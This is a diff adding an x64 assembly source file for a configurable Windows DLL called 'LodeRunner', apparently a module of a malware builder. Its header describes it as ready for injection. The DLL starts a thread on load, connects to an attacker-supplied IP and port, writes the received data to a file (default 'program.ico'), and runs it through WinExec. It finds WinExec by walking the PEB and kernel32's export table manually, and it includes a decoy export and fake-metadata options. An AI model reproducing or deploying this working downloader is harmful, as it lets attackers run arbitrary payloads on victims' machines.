@@ -1,0 +1,380 @@
+#!name##LodeRunner
+#!types##module
+#!info##[DLL] [x64] Ready DLL for injection. Run thread and opens a TCP socket connection, downloads a file and runs it. The function runs automatically after a specified time. It also exports the function responsible for downloading: 'MASTER'.
+#!subTypes##dll
+#!options##DLL_COMPILER##mingw-x64
+#!options##DLL_NO_DLL##True
+#!globalVar##TARGET_OS##win##Target system
+#!lang##asm
+#!arch##x64
+#!reqVar##IP_ADDR##Host ip address.##str
+#!reqVar##LDR_port##Host port number##int
+#!setVar##LDR_port##4000##int
+#!reqVar##LDR_pause##Pause in miliseconds before the getter function executes.##int
+#!setVar##LDR_pause##2000##int
+#!reqVar##LDR_fname##Name of the file that will be created and run. The file can be without the 'exe' extension.##str
+#!setVar##LDR_fname##program.ico##str
+#!options##DLL_CS##BasicDll2
+#!reqFood##FOOD_company##FOOD_company_name##Company name database
+#!reqFood##FOOD_app##FOOD_app_name##Application name database
+#!reqFood##FOOD_fdesc##FOOD_file_description##Application description database
+
+
+
+
+
+; force RIP-relative addressing
+default rel
+
+global DllMain
+global MATCH
+global MASTER
+
+%define MSG_WAITALL  0x0008
+%define FILE_GENERIC_ALL 0x10000000
+%define FILE_ATTRIBUTE_NORMAL 0x80
+%define LEN_RECV_DATA 128*1024      ; in bytes
+
+
+extern printf
+extern WSAStartup
+extern WSAGetLastError
+extern WSACleanup
+extern socket
+extern connect
+extern inet_addr    ;The inet_addr function converts a string containing an IPv4 dotted-decimal address into a proper address for the IN_ADDR structure.
+extern htons    ;The htons function converts a u_short from host to TCP/IP network byte order (which is big-endian).
+extern Sleep
+extern recv
+extern closesocket
+extern CreateFileA
+extern GetLastError
+extern WriteFile
+extern CloseHandle
+extern lstrcmpA
+extern CreateThread
+extern DisableThreadLibraryCalls
+
+
+
+; Socket constants
+AF_INET equ 2
+SOCK_STREAM equ 1
+IPPROTO_TCP equ 6
+
+section .data
+    text_fake: db "Hello friend", 10, 0
+
+    time_sleep: equ 2
+    file_name: db "{{LDR_fname}}", 0
+    IP_ADDR: db "{{IP_ADDR}}", 0
+    PORT: equ {{LDR_port}}
+    func_name: db "WinExec", 0
+    
+
+section .bss
+    ws_data: resb 400   ; wsa data struct
+    socket_fd: resq 1   ; socket file descriptor
+    sock_addr: resb 16  ; sock_addr struct 16 bytes 
+    recv_buff: resb LEN_RECV_DATA    ; recive data buffer
+    file_handle: resq 1 ; file handler
+    recv_count: resq 1  ; number of recive bytes
+    k32: resq 1     ; kernel32.dll address
+
+
+section .text
+
+DllMain:
+;   RCX = hinstDLL, RDX = fdwReason, R8 = lpReserved
+    cmp rdx, 1
+    jne DM_end
+    
+    sub rsp, 48 ;shadow space
+    call DisableThreadLibraryCalls
+    
+    mov rcx, 0  ; [in, optional] lpThreadAttributes
+    mov rdx, 0  ; [in] dwStackSize
+    lea r8, [MASTER]    ; [in] lpStartAddress
+    mov r9, 0   ; [in, optional] lpParameter
+    mov qword [rsp+32], 0   ;[in] dwCreationFlags
+    mov qword [rsp+40], 0   ; [out, optional] lpThreadId
+    call CreateThread
+    add rsp, 48 ; restore stack
+
+    
+    DM_end:
+        mov rax, 1
+        ret
+
+MATCH:
+    mov rbp, rsp
+    push rbp
+    
+    sub rsp, 32 ;shadow space
+    mov rcx, text_fake
+    call printf
+    add rsp, 32 ;restore stack
+    
+    pop rbp
+    ret
+
+
+MASTER:
+    mov rbp, rsp
+    push rbp
+    
+    ; pause
+    sub rsp, 32 ;shadow space
+    mov rcx, {{LDR_pause}}
+    call Sleep
+    add rsp, 32 ;restore stack
+    
+
+    ; init WSA and create socket tcp
+    MASTER_CS:
+        sub rsp, 32 ;shadow space
+        mov rcx, 0x0202 ; wVersionRequired
+        lea rdx, [ws_data]
+        call WSAStartup
+        add rsp, 32 ;restore stack
+        cmp rax, 0
+        jne BUILD_ERROR
+        
+        
+       
+    ; -------- create socket -----------------
+        sub rsp, 32 ;shadow space
+        mov rcx, AF_INET    ;The address family specification.
+        mov rdx, SOCK_STREAM    ; The type specification for the new socket.
+        mov r8, IPPROTO_TCP ;The protocol to be used.
+        call socket
+        add rsp, 32 ;restore stack
+        cmp rax, -1
+        je BUILD_ERROR
+        mov [rel socket_fd], rax
+        
+        
+    ; -------- fill sock addr ------------
+    
+    
+        ;   struct sockaddr_in {
+    ;       short   sin_family; 2 bytes
+    ;       u_short sin_port;   2 bytes
+    ;       struct  in_addr sin_addr; 4 bytes
+    ;       char    sin_zero[8];
+    ;      };
+        
+    
+        ; SIN_FAMILY
+        lea rbx, [sock_addr]
+        mov qword [rbx], AF_INET
+        
+        ; SIN_PORT
+        sub rsp, 32 ;shadow space
+        mov rcx, PORT
+        call htons
+        
+        lea rbx, [sock_addr]
+        mov [rbx + 2], rax  ; save sin_port to struct
+        
+        ; IP ADDR
+        mov rcx, IP_ADDR
+        call inet_addr
+        
+        lea rbx, [sock_addr]
+        mov [rbx+4], rax    ; sace ip addr to struct
+         
+        add rsp, 32 ;restore stack
+
+    ; Try connecting to HOST
+    MASTER_CONN:
+
+        ; try connect
+        sub rsp, 32 ;shadow space
+        lea rcx, [socket_fd]
+        mov rcx, [rcx]
+        lea rdx, [sock_addr]
+        mov r8, 16  ; length sock_addr struct
+        call connect
+        add rsp, 32 ; restore stack
+        cmp rax, 0
+        jne MC_error
+        
+        
+        MASTER_RECV:
+            sub rsp, 32 ;shadow space
+            lea rcx, [socket_fd]
+            mov rcx, [rcx]
+            lea rdx, [recv_buff]
+            mov r8, LEN_RECV_DATA    ; [in] len
+            mov r9, MSG_WAITALL
+            call recv
+            add rsp, 32 ;restore stack
+            cmp rax, 0
+            je MASTER_close
+            
+            lea rbx, [recv_count]
+            mov [rbx], rax  ; save number recive bytes
+            
+    
+    ; Create File
+    MASTER_cfile:
+        sub rsp, 56 ;shadow space
+        mov rcx, file_name      ; LPCSTR lpFileName,
+        mov rdx, FILE_GENERIC_ALL   ;DWORD dwDesiredAccess
+        mov r8, 0           ; [in] dwShareMode
+        mov r9, 0           ; [in, optional] lpSecurityAttributes
+        mov qword [rsp+32], 2     ; [in] dwCreationDisposition
+        mov qword [rsp+40], FILE_ATTRIBUTE_NORMAL     ; [in] dwFlagsAndAttributes
+        mov qword [rsp+48], 0     ; [in, optional] hTemplateFile
+        call CreateFileA
+        add rsp, 56 ; restore stack
+        cmp rax, -1
+        je MASTER_cfile_error
+        lea rbx, [file_handle]
+        mov [rbx], rax      ; save file handler
+        
+        ; write to file
+        sub rsp, 40 ;shadow space
+        lea rcx, [file_handle]
+        mov rcx, [rcx]  ; [in] hFile
+        lea rdx, [recv_buff]  ; [in] lpBuffer
+        lea r8, [recv_count]
+        mov r8, [r8]      ;[in] nNumberOfBytesToWrite
+        mov r9, 0       ; [out, optional] lpNumberOfBytesWritten
+        mov qword [rsp+32], 0   ;[in, out, optional] lpOverlapped
+        call WriteFile
+        add rsp, 40 ;restore stack
+        cmp rax, 0
+        je MASTER_cfile_error
+        
+        sub rsp, 32 ;shadow space
+        lea rcx, [file_handle]
+        mov rcx, [rcx]
+        call CloseHandle
+        add rsp, 32 ;restore stack
+        
+        sub rsp, 32 ;shadow space
+        lea rcx, [socket_fd]
+        mov rcx, [rcx]
+        call closesocket
+        call WSACleanup
+        add rsp, 32 ;restore stack
+        
+       
+        
+        sub rsp, 16 ;function space
+        call FindFunc
+        add rsp, 16 ; restore stack
+        
+        
+        jmp MASTER_EXIT
+        
+        
+        MASTER_cfile_error:
+            jmp MASTER_close
+            
+
+
+    ; show error and back to connect function
+    MC_error:
+        sub rsp, 32 ;shadow space
+        mov rcx, time_sleep
+        call Sleep
+        add rsp, 32 ;shadow space
+        jmp MASTER_CONN
+    
+    MASTER_close:
+        sub rsp, 32 ;shadow space
+        lea rcx, [socket_fd]
+        mov rcx, [rcx]
+        call closesocket
+        call WSACleanup
+        add rsp, 32 ;restore stack
+        jmp MASTER_EXIT
+
+MASTER_EXIT:
+    pop rbp
+    ret                                              
+                
+                                
+BUILD_ERROR:
+    sub rsp, 32 ;shadow space
+
+    call WSACleanup
+    add rsp, 32 ;restore stack
+    xor rax, rax    ; return False
+    pop rbp ;restore stack
+    ret
+
+
+FindFunc:
+    mov rbp, rsp
+    push rbp
+    
+    mov rbx, gs:[0x60]  ; Get address of PEB struct
+    mov rbx, [rbx+0x18] ; Get PEB_LDR_DATA address
+    mov rbx, [rbx+0x20] ; Get InMemoryOrderModuleList
+    mov rbx, [rbx]  ; 1st entry in InMemoryOrderModuleList (ntdll.dll)
+    mov rbx, [rbx]  ; 2st entry in InMemoryOrderModuleList (kernel32.dll)
+    mov rdi, [rbx+0x20]  ; Get kernel32.dll address
+    
+    lea rbx, [k32]
+    mov [rbx], rdi  ; save kernel32 addr
+    
+    xor rbx, rbx
+    mov ebx, [rdi+0x3c]
+    add rbx, rdi    ; RVA PE + kernel32
+    add rbx, 0x88   ; EXPORT TABLE
+    
+    mov ebx, [rbx]  ; RVA Export Table
+    add rbx, rdi    ; RVA ET + kernel32
+    
+    ; rdi - kernel32.dll addr
+    ; rbx - Export Table addr
+    
+    mov r15d, [rbx+0x14]    ; get number of functions
+    mov r12d, [rbx+0x20]    ; table Function Name
+    add r12, rdi    ; RVA Function Name + kernel32 addr
+    
+    xor rsi, rsi    ;counter
+    .loop:
+        cmp rsi, r15
+        je .exit
+        mov r13d, [r12 + 4 * rsi]   ; get function name
+        sub rsp, 32 ;shadow space
+        mov rcx, r13
+        add rcx, rdi
+        mov rdx, func_name
+        call lstrcmpA
+        add rsp, 32 ;restore stack
+        cmp rax, 0
+        je .finded
+        inc rsi
+        jmp .loop
+        
+    
+    
+    .exit:
+        pop rbp
+        ret
+    
+    .finded:
+        mov r12d, [rbx + 0x24] ; Get AddressOfNameOrdinals RVA
+        add r12, rdi    ; ANO RVA + kernel32
+        mov r14w, [r12 + 2 * rsi]
+        
+        mov r12d, [rbx + 0x1c]  ; Get AddressOfFunctions RVA
+        add r12, rdi    ; AF RVA + kernel32
+        mov r14d, [r12 + 4 * rsi]
+        add r14, rdi    ; Function RVA + kernel32
+
+        
+        sub rsp, 32 ;shadow space
+        mov rcx, file_name
+        mov rdx, 0
+        call r14
+        add rsp, 32 ;restore stack
+        
+        
+        jmp .exit
